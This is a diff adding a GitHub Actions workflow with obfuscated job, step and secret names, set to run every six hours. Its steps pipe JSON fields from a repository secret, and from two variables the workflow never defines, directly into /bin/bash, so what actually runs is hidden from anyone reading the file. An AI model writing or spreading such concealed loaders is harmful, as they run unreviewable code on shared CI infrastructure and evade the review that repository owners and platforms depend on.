@@ -1,0 +1,21 @@
+name: ahaidxunzhengou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ahaidxunzhengou
+        env:
+          wzkcz4670: ${{ secrets.wzkcz4670 }}
+        run: |
+          echo $wzkcz4670 | jq -r .yrf872 | /bin/bash
+          echo $v2 | jq -r .x246 | /bin/bash
+          echo $dx448 | jq -r .rtwmm63 | /bin/bash
+
